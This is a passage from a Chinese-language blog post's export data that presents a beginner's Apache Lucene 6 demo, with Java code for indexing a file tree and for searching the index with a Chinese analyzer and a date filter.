Date();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//*********** calculate the time **********//</span></span><br><span class=\"line\">\t\t\tSystem.out.println(end.getTime() - start.getTime() + <span class=\"string\">\" total milliseconds\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\" caught a \"</span> + e.getClass() +</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">\"\\n with message: \"</span> + e.getMessage());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//*********** traverse the file tree ************//</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">indexDocs</span><span class=\"params\">(<span class=\"keyword\">final</span> IndexWriter writer, Path path)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Files.isDirectory(path)) &#123;</span><br><span class=\"line\">\t\t\tFiles.walkFileTree(path, <span class=\"keyword\">new</span> SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">\t\t\t\t<span class=\"function\"><span class=\"keyword\">public</span> FileVisitResult <span class=\"title\">visitFile</span><span class=\"params\">(Path file, BasicFileAttributes attrs)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t\tindexDoc(writer, file, attrs.lastModifiedTime().toMillis());</span><br><span class=\"line\">\t\t\t\t\t&#125; <span class=\"keyword\">catch</span> (IOException ignore) &#123;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> FileVisitResult.CONTINUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tindexDoc(writer, path, Files.getLastModifiedTime(path).toMillis());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//******** Index single document ********//</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">indexDoc</span><span class=\"params\">(IndexWriter writer, Path file, <span class=\"keyword\">long</span> lastModified)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> (InputStream stream = Files.newInputStream(file)) &#123;</span><br><span class=\"line\">\t\t\tDocument doc = <span class=\"keyword\">new</span> Document();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//*********** title ************//</span></span><br><span class=\"line\">\t\t\tField titleField = <span class=\"keyword\">new</span> StringField(<span class=\"string\">\"title\"</span>, file.getFileName().toString(), Field.Store.YES);</span><br><span class=\"line\">\t\t\tdoc.add(titleField);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//************ path ************//</span></span><br><span class=\"line\">\t\t\tField pathField = <span class=\"keyword\">new</span> StringField(<span class=\"string\">\"path\"</span>, file.toString(), Field.Store.YES);</span><br><span class=\"line\">\t\t\tdoc.add(pathField);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******* last modify time ******//</span></span><br><span class=\"line\">\t\t\tdoc.add(<span class=\"keyword\">new</span> LongPoint(<span class=\"string\">\"modified\"</span>, lastModified));</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******** content ********//</span></span><br><span class=\"line\">\t\t\tdoc.add(<span class=\"keyword\">new</span> TextField(<span class=\"string\">\"contents\"</span>, <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(stream, StandardCharsets.UTF_8))));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (writer.getConfig().getOpenMode() == OpenMode.CREATE) &#123;</span><br><span class=\"line\">\t\t\t\twriter.addDocument(doc);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\twriter.updateDocument(<span class=\"keyword\">new</span> Term(<span class=\"string\">\"path\"</span>, file.toString()), doc);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"检索文件\"><a href=\"#检索文件\" class=\"headerlink\" title=\"检索文件\"></a>检索文件</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//*SearchFiles.java*//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.charset.StandardCharsets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Date;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.wltea.analyzer.lucene.IKAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Document;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.DirectoryReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.queryparser.classic.ParseException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.queryparser.classic.QueryParser;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.IndexSearcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.Query;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.ScoreDoc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.TopDocs;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SearchFiles</span> </span>&#123;</span><br><span class=\"line\">\tString indexPath;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> repeat = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">boolean</span> raw = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\tAnalyzer analyzer;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> hitsPerPage = <span class=\"number\">300</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SearchFiles</span><span class=\"params\">(String indexPath)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.indexPath = indexPath;</span><br><span class=\"line\">\t\tanalyzer = <span class=\"keyword\">new</span> SmartChineseAnalyzer();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> String[][] query(String time0, String time1, String queryString, String field) <span class=\"keyword\">throws</span> IOException, ParseException&#123;</span><br><span class=\"line\">\t\tIndexReader reader = DirectoryReader.open(FSDirectory.open(Paths.get(indexPath)));</span><br><span class=\"line\">\t\tIndexSearcher searcher = <span class=\"keyword\">new</span> IndexSearcher(reader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tBufferedReader in = <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(System.in, StandardCharsets.UTF_8));</span><br><span class=\"line\">\t\tQueryParser parser = <span class=\"keyword\">new</span> QueryParser(field, analyzer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (queryString == <span class=\"keyword\">null</span> || queryString.length() == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询不能为空!\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tqueryString = queryString.trim();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (queryString.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询不能为空格!\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tQuery query = parser.parse(queryString);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"...Searching for: \"</span> + query.toString(field));</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (repeat &gt; <span class=\"number\">0</span>) &#123;                      <span class=\"comment\">// repeat &amp; time as benchmark</span></span><br><span class=\"line\">\t\t\tDate start = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; repeat; i++) &#123;</span><br><span class=\"line\">\t\t\t\tsearcher.search(query,<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tDate end = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Time: \"</span>+(end.getTime()-start.getTime())+<span class=\"string\">\"ms\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tScoreDoc[] hits = doPagingSearch(in, searcher, query, hitsPerPage, raw, queryString == <span class=\"keyword\">null</span>);</span><br><span class=\"line\">\t\tString[][] result = <span class=\"keyword\">new</span> String[hitsPerPage &gt; hits.length ? hits.length :hitsPerPage][<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i &lt; hits.length &amp;&amp; index &lt; hitsPerPage-<span class=\"number\">1</span> ;++i) </span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> docId = hits[i].doc;</span><br><span class=\"line\">\t\t\tDocument d = searcher.doc(docId);</span><br><span class=\"line\">\t\t\tString p = d.get(<span class=\"string\">\"path\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// judge if the doc is to choose</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">boolean</span> fin = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t\tSystem.out.println(p.charAt(<span class=\"number\">13</span>) +<span class=\"string\">\" \"</span>+ time0.charAt(<span class=\"number\">3</span>) +<span class=\"string\">\" \"</span>+ time1.charAt(<span class=\"number\">3</span>));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(p.charAt(<span class=\"number\">13</span>)&gt;=time0.charAt(<span class=\"number\">3</span>) &amp;&amp; p.charAt(<span class=\"number\">13</span>)&lt;=time1.charAt(<span class=\"number\">3</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> tm0 = (time0.charAt(<span class=\"number\">5</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time0.charAt(<span class=\"number\">6</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> tm1 = (time1.charAt(<span class=\"number\">5</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time1.charAt(<span class=\"number\">6</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> m = (p.charAt(<span class=\"number\">15</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (p.charAt(<span class=\"number\">16</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(m &gt;= tm0 &amp;&amp; m &lt;=tm1)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> td0 = (time0.charAt(<span class=\"number\">8</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time0.charAt(<span class=\"number\">9</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> td1 = (time1.charAt(<span class=\"number\">8</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time1.charAt(<span class=\"number\">9</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> day = (p.charAt(<span class=\"number\">18</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (p.charAt(<span class=\"number\">19</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(tm0 &lt; tm1 &amp;&amp; m == tm0 &amp;&amp; day &gt;= td0) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(tm0 &lt; tm1 &amp;&amp; m == tm1 &amp;&amp; day &lt;= td1) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(m &gt; tm0 &amp;&amp; m &lt; tm1) fin = <span class=\"keyword\">true</span>; </span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(m == tm0 &amp;&amp; m == tm1)</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span>(day &gt;= td0 &amp;&amp; day &lt;= td1) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"fin: \"</span>+fin); <span class=\"comment\">// for debug use</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(fin)&#123;</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">0</span>] = <span class=\"string\">\"\"</span>+(index+<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">1</span>] = d.get(<span class=\"string\">\"title\"</span>);</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">2</span>] = p.substring(<span class=\"number\">10</span>,<span class=\"number\">20</span>);</span><br><span class=\"line\">\t\t\t\tSystem.out.println(d.get(<span class=\"string\">\"path\"</span>)); <span class=\"comment\">// for debug use</span></span><br><span class=\"line\">\t\t\t\tindex += <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treader.close();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(index == -<span class=\"number\">1</span>) &#123;<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询无果!\"</span>);&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> result;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> ScoreDoc[] doPagingSearch(BufferedReader in, IndexSearcher searcher, Query query, </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> hitsPerPage, <span class=\"keyword\">boolean</span> raw, <span class=\"keyword\">boolean</span> interactive) <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Collect enough docs to show 5 pages</span></span><br><span class=\"line\">\t\tTopDocs results = searcher.search(query, <span class=\"number\">5</span> * hitsPerPage);</span><br><span class=\"line\">\t\tScoreDoc[] hits = results.scoreDocs;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> numTotalHits = results.totalHits;</span><br><span class=\"line\">\t\tSystem.out.println(numTotalHits + <span class=\"string\">\" total matching documents\"</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> hits;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关键处代码都写有注释，相信有了<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>博文的基础，也不难理解。</p>\n<h3 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h3><p><img src=\"/images/in-post/post-blog-Lucene.png\" alt=\"img\"></p>\n<h3 id=\"完整src见Github\"><a href=\"#完整src见Github\" class=\"headerlink\" title=\"完整src见Github\"></a>完整src见<a href=\"https://github.com/miyunluo/Lucene6.1-demo\" target=\"_blank\" rel=\"noopener\">Github</a></h3><p>– miyunluo 于2016.10</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“似乎什么也没写”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>暑期参加了一个只有三个人的宏大项目，一个人写爬虫，一个人写Lucene，一个我也不知道做了什么。很不凑巧，我就是写Lucene的那个。之前基本没写过java，Lucene也是第一次接触，不过也算是短时间内完成了，功能上比较简陋。今天刚结束了这个项目莫名其妙的一个答辩，写点基础的，给那些像我一样刚刚接触的同学。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Lucene是一个全文检索框架，功能异常强大，可以进行精确模糊查询还有一些高级的查询功能，其主要功能分为两大部分：索引（index）和查询（search）虽然无法与Google的搜索引擎媲美，但是作为一个开源框架，其可定制性极高，可以满足特定方面的检索需求。</p>\n<p>Lucene的介绍文档很多，但是都比较陈旧，有关最新6.0+版本的Lucene介绍，可以参考<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>，介绍的十分基础也十分详细，有样例与运行结果，对照学习效果十分好。</p>\n<p>当然，你也许会有这种感觉，看完了<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>的博文似乎还是无法下手做出什么东西来，在这里给出一个demo，供初次接触lucene的同学参考。</p>\n<h3 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//*IndexFiles.java*//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.charset.StandardCharsets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.FileVisitResult;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Path;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.SimpleFileVisitor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.attribute.BasicFileAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Date;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.TokenStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Tokenizer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.core.LowerCaseFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.core.StopFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.en.PorterStemFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.en.PorterStemFilterFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardFilterFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardTokenizer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.LongPoint;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Document;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.StringField;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.TextField;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriterConfig.OpenMode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriterConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.Term;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.Directory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.util.Version;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.tartarus.snowball.ext.PorterStemmer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span 